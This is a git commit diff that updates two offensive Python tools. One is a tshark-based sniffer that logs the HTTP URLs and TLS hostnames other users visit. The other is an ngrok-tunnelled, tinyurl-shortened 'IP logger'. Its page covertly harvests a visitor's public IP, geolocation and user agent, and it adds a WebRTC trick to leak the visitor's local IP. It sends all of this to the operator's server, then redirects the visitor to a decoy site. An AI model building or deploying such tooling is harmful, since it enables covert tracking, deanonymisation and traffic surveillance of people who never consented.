0f9e7467c6fdb69319072b722b03de8d763701c0
CodeZhifty <juulstausholmoscar@gmail.com>
2024-10-06 21:22:42 +0200

    Updated iplogger and https sniffer

--- https_sniffer.py
+++ https_sniffer.py
@@ -1,5 +1,6 @@
 import argparse
 import subprocess
+import shutil
 import sys
 import os
 
@@ -16,9 +17,22 @@ interface = args.interface
 tshark_path = None
 
 if "nt" in os.name:
-	tshark_path = r"C:\Program Files\Wireshark\tshark.exe"
+    tshark_path = r"C:\Program Files\Wireshark\tshark.exe"
+    print("[!] Locating tshark")
+    if not os.path.exists(tshark_path):
+        print("[!] Could not find tshark, download it at: https://www.wireshark.org/download.html")
+        sys.exit()
+    else:
+        print(f"[!] Found tshark.exe at {tshark_path}")
 else:
-	tshark_path = "tshark"
+    tshark_path = "tshark"
+    print("[!] Locating tshark")
+    if not shutil.which("tshark"):
+        print("[!] Could not find tshark download it with: apt install wireshark")
+        sys.exit()
+    else:
+        print("[!] Found tshark")
+		
 
 command = [tshark_path, "-i", interface, "-T", "fields", "-E", "separator=|"]
 fields = ["ip.src", "_ws.col.Protocol", "_ws.col.Info", "http.host", "tls.handshake.extensions_server_name", "frame.time_epoch"]
@@ -31,26 +45,26 @@ process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.ST
 print("[!] Sniffing http & https packets.")
 
 try:
-	for line in iter(process.stdout.readline, b""):
-		columns = line.decode().strip().split("|")
-		try:
-			src_ip = columns[0]
-			protocol = columns[1]
-			info = columns[2].split(" ")
-			http_host = columns[3]
-			https_host = columns[4]
-			epoch_time = columns[5]
+    for line in iter(process.stdout.readline, b""):
+        columns = line.decode().strip().split("|")
+        try:
+            src_ip = columns[0]
+            protocol = columns[1]
+            info = columns[2].split(" ")
+            http_host = columns[3]
+            https_host = columns[4]
+            epoch_time = columns[5]
 
-			if "HTTP" in protocol:
-				if "GET" in info:
-					url = http_host + info[1]
-					print(f"[+] Time: {epoch_time}, Source: {src_ip}, Protocol: {protocol}, Method: {info[0]}, URL: {url}")
+            if "HTTP" in protocol:
+                if "GET" in info:
+                    url = http_host + info[1]
+                    print(f"[+] Time: {epoch_time}, Source: {src_ip}, Protocol: {protocol}, Method: {info[0]}, URL: {url}")
 
-			if "TLS" in protocol:
-				if not "google" in https_host and https_host:
-					print(f"[+] Time: {epoch_time}, Source: {src_ip}, Protocol: {protocol}, URL: {https_host}")
-		except:
-			continue
+            if "TLS" in protocol:
+                if https_host:
+                    print(f"[+] Time: {epoch_time}, Source: {src_ip}, Protocol: {protocol}, URL: {https_host}")
+        except:
+            continue
 except KeyboardInterrupt:
-	print("[!] Sniffing stopped.")
-	sys.exit()
+    print("[!] Sniffing stopped.")
+    sys.exit()
--- iplogger.py
+++ iplogger.py
@@ -1,13 +1,14 @@
 import logging
 logging.getLogger('werkzeug').disabled = True
-import flask.cli
-flask.cli.show_server_banner = lambda *args: None
-from flask import Flask, request
+logging.getLogger().setLevel(logging.CRITICAL)
+from flask import Flask, request, cli
 from flask_cors import CORS
-import requests
+cli.show_server_banner = lambda *args: None
 from pyngrok import ngrok
+import requests
 import sys
 import argparse
+import socket
 
 parser = argparse.ArgumentParser(formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=200))
 parser.add_argument("-t", "--token", help="Ngrok authtoken", required=True)
@@ -21,7 +22,7 @@ ngrok_token, redirect_url = args.token, args.redirect
 
 PORT = 5000
 
-logger_html = """
+logger_html = r"""
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -32,25 +33,73 @@ logger_html = """
 </head>
 <body>
     <script>
-        const useragent = navigator.userAgent;
-        fetch("https://ipapi.co/json/")
-        .then(response => response.json())
-        .then(ipdata => {
-            fetch("|URL|/log", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    ipdata: ipdata,
-                    useragent: useragent
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-            	location.replace("|REDIRECT|")
+        function getLocalIP() {
+            return new Promise(function(resolve, reject) {
+                var RTCPeerConnection = /*window.RTCPeerConnection ||*/ window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+                if (!RTCPeerConnection) {
+                    reject('Your browser does not support this API');
+                }
+                var rtc = new RTCPeerConnection({iceServers:[]});
+                var addrs = {};
+                addrs["0.0.0.0"] = false;
+                function grepSDP(sdp) {
+                    var hosts = [];
+                    var finalIP = '';
+                    sdp.split('\r\n').forEach(function (line) {
+                        if (~line.indexOf("a=candidate")) {
+                            var parts = line.split(' '),
+                            addr = parts[4],
+                            type = parts[7];
+                            if (type === 'host') {
+                                finalIP = addr;
+                            }
+                        } else if (~line.indexOf("c=")) {
+                            var parts = line.split(' '),
+                            addr = parts[2];
+                            finalIP = addr;
+                        }
+                    });
+                    return finalIP;
+                }
+                if (1 || window.mozRTCPeerConnection) {
+                    rtc.createDataChannel('', {reliable:false});
+                };
+                rtc.onicecandidate = function (evt) {
+                    if (evt.candidate) {
+                        var addr = grepSDP("a="+evt.candidate.candidate);
+                        resolve(addr);
+                    }
+                };
+                rtc.createOffer(function (offerDesc) {
+                    rtc.setLocalDescription(offerDesc);
+                }, function (e) { console.warn("offer failed", e); });
             });
-        });
+        }
+
+        function sendLog(localip) {
+            const useragent = navigator.userAgent;
+            fetch("https://ipapi.co/json/")
+            .then(response => response.json())
+            .then(ipdata => {
+                console.log(localip);
+                fetch("|URL|/log", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        ipdata: ipdata,
+                        localip: localip,
+                        useragent: useragent
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    location.replace("|REDIRECT|")
+                });
+            });
+        }
+        getLocalIP().then(localip => sendLog(localip)).catch(e => sendLog("unknown"));
     </script>
 </body>
 </html>
@@ -59,22 +108,39 @@ logger_html = """
 ngrok.set_auth_token(ngrok_token)
 ngrok_tunnel = ngrok.connect(PORT)
 url = ngrok_tunnel.public_url
-res = requests.get(f"https://tinyurl.com/api-create.php?url={url}")
-print(f"[!] IP Logger is running on: {res.text}")
+short_url = requests.get(f"https://tinyurl.com/api-create.php?url={url}").text
+
+print(f"[!] Ip Logger is running on: {short_url}")
+
+def replace_all(replace_list, text):
+    for key in replace_list:
+        text = text.replace(key, replace_list[key])
+    return text
+
 try:
-	app = Flask(__name__)
-	CORS(app)
+    app = Flask(__name__)
+    CORS(app)
 
-	@app.route("/")
-	def index():
-		return logger_html.replace("|URL|", url).replace("|REDIRECT|", redirect_url).replace("|TITLE|", redirect_url.replace("https://", ""))
+    @app.route("/")
+    def index():
+        replace_list = {
+            "|URL|": url,
+            "|REDIRECT|": redirect_url,
+            "|TITLE|": redirect_url.replace("https://", "")
+        }
+        return replace_all(replace_list, logger_html)
 
-	@app.route("/log", methods=["POST"])
-	def log():
-		data = request.get_json()
-		print(f"[+] Ip: {data['ipdata']['ip']}, City: {data['ipdata']['city']}, Country: {data['ipdata']['country_name']}, Provider: {data['ipdata']['org']}, UserAgent: {data['useragent']}")
-		return {"error": False, "message": "done"}
+    @app.route("/log", methods=["POST"])
+    def log():
+        data = request.get_json()
+        try:
+            localip = socket.gethostbyname(data["localip"])
+        except:
+            localip = data["localip"]
+        print("[+] Ip Logged:")
+        print(f"   - Local Ip: {localip},\n   - Public Ip: {data['ipdata']['ip']},\n   - City: {data['ipdata']['city']},\n   - Country: {data['ipdata']['country_name']},\n   - Provider: {data['ipdata']['org']},\n   - UserAgent: {data['useragent']}")
+        return {"error": False, "message": "done"}
 
-	app.run(port=PORT)
+    app.run(port=PORT)
 finally:
-	print("[!] IP Logger stopped.")
+    print("[!] Ip Logger stopped.")
